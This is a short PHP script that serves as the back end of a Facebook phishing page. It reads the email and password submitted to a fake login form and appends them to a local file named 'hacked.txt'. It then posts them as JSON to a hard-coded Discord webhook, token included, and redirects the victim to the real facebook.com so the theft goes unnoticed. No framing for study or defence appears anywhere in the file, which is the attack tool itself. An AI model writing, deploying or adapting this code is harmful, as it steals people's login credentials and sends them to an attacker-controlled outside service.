<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $username = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    file_put_contents('hacked.txt', "USERNAME= $username, PASSWORD= $password\n", FILE_APPEND);

    $data = array(
        'content' => "WEBSITE=FACEBOOK\nUSERNAME=$username\nPASSWORD=$password"
    );

    $jsonPayload = json_encode($data);

    $webhookUrl = "https://discord.com/api/webhooks/1214808664179736636/Gotfep7Fhz8AaMmWxnq5vVX8g_4ARxK8aF5dkRzbjvf8AFZshWDvEa9R8wgKMhn_mBqS";

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo 'cURL error: ' . curl_error($ch);
    } else {
        echo 'Message sent to Discord successfully!';
    }

    curl_close($ch);

    header("Location: https://www.facebook.com/");
    exit;
}
?>